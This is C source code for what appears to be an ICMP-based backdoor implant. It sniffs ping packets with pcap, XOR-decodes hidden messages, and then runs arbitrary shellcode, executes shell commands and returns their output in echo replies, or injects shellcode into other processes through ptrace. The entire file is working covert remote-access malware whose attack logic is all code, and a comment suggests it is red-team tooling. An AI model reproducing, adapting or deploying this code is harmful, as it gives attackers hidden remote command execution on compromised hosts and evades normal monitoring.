#include "rooty.h"

int build_packet(unsigned char *pkt, const struct icmphdr *icmp_input, uint8_t *data, uint32_t size) {
	struct icmphdr *icmp = NULL;
	uint8_t *pkt_data = NULL;

	if((pkt != NULL) && (icmp_input != NULL)) {

		icmp = (struct icmphdr *)pkt;
		pkt_data = (uint8_t *)(pkt + sizeof(struct icmphdr));

		// Required ICMP fields
		icmp->type = 0;
		icmp->code = 0;
		icmp->un.echo.id = icmp_input->un.echo.id;
		icmp->un.echo.sequence = icmp_input->un.echo.sequence;
		icmp->checksum = icmp_input->checksum;

		// Copy the data into the packet
		memcpy(pkt_data, data, size);

		return (sizeof(struct icmphdr) + size);	
	}
	
	return 0;
}

void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
	uint32_t pkt_size = sizeof(struct icmphdr) + size;
	uint8_t encrypted_data[size], *key = NULL, pkt[pkt_size];
	struct sockaddr_in sin;
	int output_socket = 0;

	// Make sure we have data
	if(size > 0) {

		// Generate the key for transmission
		key = (unsigned char *)&icmp->checksum;

		// Encrypt the data
		if(decrypt_message(data, encrypted_data, size, key) == size) {

			// Clear out the packet
			memset(pkt, 0, pkt_size);

			// Create our packet
			if((pkt_size = build_packet(pkt, icmp, encrypted_data, size)) > 0) {

				// Fill in the sockaddr
				sin.sin_family = AF_INET;
				sin.sin_port = 0;
				sin.sin_addr.s_addr = ip->saddr;

				// Create our socket for sending responses
				if((output_socket = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) > 0) {

					// Not going to worry about failures
					if(sendto(output_socket, pkt, pkt_size, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) <= 0) {
						DEBUG_WRAP(fprintf(stderr, "Unable to send packet\n"));
					}

					close(output_socket);
				}
			}
		}
	}
}

int inject_remote_shellcode(uint16_t pid, const unsigned char *shellcode, size_t shellcode_size) {
	HIJACK *hijack = NULL;
	unsigned long shellcode_addr;
	struct user_regs_struct *backup = NULL;
	
	unsigned char fork_stub[] =
        	"\x60"                          // pushad
        	"\xb8\x02\x00\x00\x00"          // mov    $0x2,%eax
        	"\x31\xdb"                      // xor    %ebx,%ebx
        	"\xcd\x80"                      // int    $0x80
        	"\x90\x90\x90"                  // nop ; nop ; nop
        	"\x85\xc0"                      // test   %eax,%eax
        	"\x74\x0c"                      // je     17 <child>
        	"\x61"                          // popad
        	"\x68\x44\x43\x42\x41"          // push dword 0x41424344
        	"\xc3"                          // ret
        	"\x90\x90\x90\x90"
        	"\x90\x90\x90\x90"
        	"\x90\x90\x90\x90"
        	"\x90\x90\x90\x90"
        	"\x90\x90\x90\x90";	
	
	DEBUG_WRAP(fprintf(stderr, "Received shellcode injection request into %d\n", pid));

	if((hijack = InitHijack()) == NULL) {
                DEBUG_WRAP(fprintf(stderr, "Unable to initialize libhijack.\n"));
                return -1;
        }	

	DEBUG_WRAP(ToggleFlag(hijack, F_DEBUG));
        DEBUG_WRAP(ToggleFlag(hijack, F_DEBUG_VERBOSE));
	
	if((AssignPid(hijack, pid)) != ERROR_NONE) {	
		DEBUG_WRAP(fprintf(stderr, "Failed to assign the PID to the hijack instance.\n"));
		return -1;
	}

	if(Attach(hijack) != ERROR_NONE) {
		DEBUG_WRAP(fprintf(stderr, "Failed to ptrace attach to %d.\n", pid));
		return -1;
	}
	DEBUG_WRAP(fprintf(stderr, "Successfully attached to %d.\n", pid));

	if((backup = GetRegs(hijack)) == NULL) {
		DEBUG_WRAP(fprintf(stderr, "Failed to get register state.\n"));
		Detach(hijack);
		return -1;
	}
	DEBUG_WRAP(fprintf(stderr, "Registers backed up\n"));

	if(LocateSystemCall(hijack) != ERROR_NONE) {
		DEBUG_WRAP(fprintf(stderr, "Failed to resolve system calls.\n"));
		Detach(hijack);
		return -1;
	}	
	DEBUG_WRAP(fprintf(stderr, "Finished looking up system calls\n"));
		
	if((shellcode_addr = MapMemory(hijack, (unsigned long)NULL, 4096,PROT_READ | PROT_EXEC | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE)) == 0) {
		DEBUG_WRAP(fprintf(stderr, "Failed to map memory in the process.\n"));
		Detach(hijack);
		return -1;
	}
	DEBUG_WRAP(fprintf(stderr, "Memory mapped successfully: %p\n", (void *)shellcode_addr));
	
	if(WriteData(hijack, shellcode_addr, (unsigned char *)fork_stub, sizeof(fork_stub)) != ERROR_NONE) {
		DEBUG_WRAP(fprintf(stderr, "Failed to write the fork_stub to memory.\n"));
		Detach(hijack);
		return -1;
	
	}
	DEBUG_WRAP(fprintf(stderr, "Fork stub written successfully\n"));

	if(WriteData(hijack, shellcode_addr + sizeof(fork_stub) - 1, (unsigned char *)shellcode, shellcode_size) != ERROR_NONE) {
		DEBUG_WRAP(fprintf(stderr, "Failed to write the shellcode to memory.\n"));
		Detach(hijack);
		return -1;
	}
	DEBUG_WRAP(fprintf(stderr, "Shellcode written successfully\n"));

	if(WriteData(hijack, shellcode_addr + 19, (unsigned char *)&backup->eip, 4) != ERROR_NONE) {
		DEBUG_WRAP(fprintf(stderr, "Failed to patch the original EIP back to %p.\n", (void *)backup->eip));
		Detach(hijack);
		return -1;
	}
	DEBUG_WRAP(fprintf(stderr, "Original EIP patched to %p\n", (void *)backup->eip));
	
	backup->eip = shellcode_addr + 2;	// This fixes a weird issue with interruping syscalls	
	if(SetRegs(hijack, backup) != ERROR_NONE) {
		DEBUG_WRAP(fprintf(stderr, "Error setting new EIP\n"));
		Detach(hijack);
		return -1;
	}	
	DEBUG_WRAP(fprintf(stderr, "EIP updated\n"));

	Detach(hijack);
	DEBUG_WRAP(fprintf(stderr, "Red team go!\n"));
	return 0;

}

void __attribute__ ((noinline)) execute_shellcode(const unsigned char *shellcode, const unsigned char *stack ) {

#ifdef __i386__

	// We dont' care about the old return address
	__asm__("pop %eax");

	// Save the new eip
	__asm__("pop %eax");
	
	// Set up the new stack
	__asm__("pop %esp");

	// Finally jump to the shellcode
	__asm__("jmp *%eax");

#else

	// Set up the new stack
	__asm__("mov %rsi, %rsp");

	// Finally jump to the shellcode
	__asm__("jmp *%rdi");

#endif
}

void run_shellcode(const unsigned char *shellcode, uint32_t size) {
	unsigned char *executable = NULL, *new_stack = NULL;
	
	// We need some more memory to work
	if((executable = mmap(NULL, size, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) == MAP_FAILED) {
		DEBUG_WRAP(fprintf(stderr, "Failed to mmap new executable area\n"));
		return;
	}
	// Copy our prefix and shellcode in
	if(memcpy(executable, shellcode, size) != executable) {
		DEBUG_WRAP(fprintf(stderr, "Failed to copy shellcode to new executable memory region\n"));
		return;
	}
	// We need some more memory to work
        if((new_stack = mmap(NULL, STACK_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) == MAP_FAILED) {
		DEBUG_WRAP(fprintf(stderr, "Failed to mmap new stack area\n"));
		return;
	}

	execute_shellcode(executable, new_stack + (STACK_SIZE / 2));
}

void run_command(const unsigned char *command, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
	FILE *fd = NULL;
	uint8_t buf[MAX_PACKET_SIZE], msg[MAX_PACKET_SIZE + strlen(MAGIC) + 1], *msg_data;
	uint32_t read = 0;
	uint32_t msg_hdr_size = strlen(MAGIC) + 1;
	uint32_t msg_size = sizeof(msg);
	uint32_t msg_data_size = msg_size - msg_hdr_size;
	uint32_t cmd_size = size + strlen(REDIRECT) + 1;
	uint8_t cmd[cmd_size];

	// Need to copy and null terminate the command
	memset(cmd, 0, cmd_size);
	memcpy(cmd, command, size);
	strncat((char *)cmd, REDIRECT, cmd_size);

	// Set the response magic and type
	memset(msg, 0, msg_size);
	strncat((char *)msg, MAGIC, msg_size);
	strncat((char *)msg, "\x02", msg_size);

	// Quack
	msg_data = msg + msg_hdr_size;
	
	// Zero out buf as well
	memset(buf, 0, sizeof(buf));

	// Execute the command
	if((fd = popen((char *)cmd, "r")) != NULL) {
		while((read = fread(buf, 1, MAX_PACKET_SIZE, fd)) > 0) {

			// Need to pad if there isn't enough data (already nulled out)
			if(read < 18) {
				read = 18;
			}

			// Add the data to the already created packet header
			memcpy(msg_data, buf, read);
			send_packet(msg, read + msg_hdr_size, ip, icmp);

			// Zero out everything for the next bit of data
			memset(buf, 0, sizeof(buf));
			memset(msg_data, 0, msg_data_size);
			fflush(fd);
		}

		pclose(fd);
	}
}

uint32_t decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint32_t size, unsigned char *key) {
	uint32_t ctr;


	for(ctr = 0; ctr < size; ctr++) {	
		decoded_data[ctr] = ((data[ctr] ^ key[0]) ^ key[1]);
	}

	return ctr;
}

void process_message(const unsigned char *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
	unsigned char decoded_data[size];
	unsigned char *key = (unsigned char *)&(icmp->checksum);
	uint32_t data_len = 0, hdr_len = 0;
	uint8_t msg_type = 0;
   pid_t pid;
   int status =0;
	// Make sure we have data
	if(size > 0) {

		// Decrypt the message (I know right?)
		if(decrypt_message(data, decoded_data, size, key) > 0) {

			// Make sure the magic is there
			if(!strncmp((char *)decoded_data, MAGIC, strlen(MAGIC))) {
				hdr_len = strlen(MAGIC) + 1;
				data_len = size - hdr_len;
				msg_type = decoded_data[hdr_len - 1];

				// First byte should be the message type
				if((pid = fork()) >= 0) {
					
					// Make sure we are in the child
					if(pid == 0) {
						switch(msg_type) {
							printf("Hello there\n");
							case MESSAGE_SHELLCODE:
								DEBUG_WRAP(fprintf(stderr, "Received shellcode packet\n"));
								run_shellcode(decoded_data + hdr_len, data_len);
								break;
							case MESSAGE_COMMAND:
								DEBUG_WRAP(fprintf(stderr, "Received command packet\n"));
								run_command(decoded_data + hdr_len, data_len, ip, icmp);
								break;
							case MESSAGE_REMOTE_SHELLCODE:
								DEBUG_WRAP(fprintf(stderr, "Received remote shellcode packet\n"));
								inject_remote_shellcode(*(uint16_t *)(decoded_data + hdr_len),decoded_data + hdr_len + 2, data_len - 1);
								break;
						}

						exit(0);
					}
					else {
						waitpid(-1, &status, WNOHANG | WUNTRACED | WCONTINUED);
					}
				}
			}
		}
	}
}

void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_char *pkt) {
//	const struct ether_arp *ethernet = NULL;
	const struct iphdr *ip = NULL;
	const struct icmphdr *icmp = NULL;
	uint32_t size_ip, size_icmp;//, size_data;
	const unsigned char *data = NULL;

	// Ethernet
	//ethernet = (struct ether_arp *)pkt;

	// IP
	ip = (struct iphdr *)(pkt + SIZE_ETHERNET);
	size_ip = ((ip->ihl & 0x0f) * 4);
	
	// ICMP
	icmp = (struct icmphdr *)(pkt + SIZE_ETHERNET + size_ip);
	size_icmp = sizeof(struct icmphdr);

	// Data
	data = (unsigned char *)(pkt + SIZE_ETHERNET + size_ip + size_icmp);

	// Only want to deal with icmp echo requests
	if((icmp->type == 8) && (icmp->code == 0)) {
		process_message(data, (hdr->len - (data - pkt)), ip, icmp);
	}
}

int main(int argc, char **argv) {
	pcap_t *handle = NULL;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	bpf_u_int32 mask, net;
	char bpf_filter[] = "icmp";

	// Seed random for later
	srand(time(NULL));

	// Opening the pcap device
	if((handle = pcap_open_live(INTERFACE, BUFSIZ, 0, 1000, errbuf)) == NULL) {
		DEBUG_WRAP(fprintf(stderr, "Error opening device %s: %s\n", INTERFACE, errbuf));
		return -1;
	}

	// Need some extra information about the network interface
	if(pcap_lookupnet(INTERFACE, &net, &mask, errbuf)) {
		DEBUG_WRAP(fprintf(stderr, "Error getting interface information for %s: %s\n", INTERFACE, errbuf));
		return -1;
	}

	// Make sure we got information
	if((mask == 0) || (net == 0)) {
		DEBUG_WRAP(fprintf(stderr, "Error getting interface information for %s\n", INTERFACE));
		return -1;
	}

	// We only want to see ICMP traffic
	if(pcap_compile(handle, &fp, bpf_filter, 0, mask)) {
		DEBUG_WRAP(fprintf(stderr, "Error compiling bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle)));
		return -1;
	}

	// Finally set up our filter
	if(pcap_setfilter(handle, &fp)) {
		DEBUG_WRAP(fprintf(stderr, "Error applying bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle)));
		return -1;
	}

	// We don't care about children
	signal(SIGCHLD, SIG_IGN);

	// Now we can finally sniff
	pcap_loop(handle, -1, process_packet, NULL);

	return 0;
}

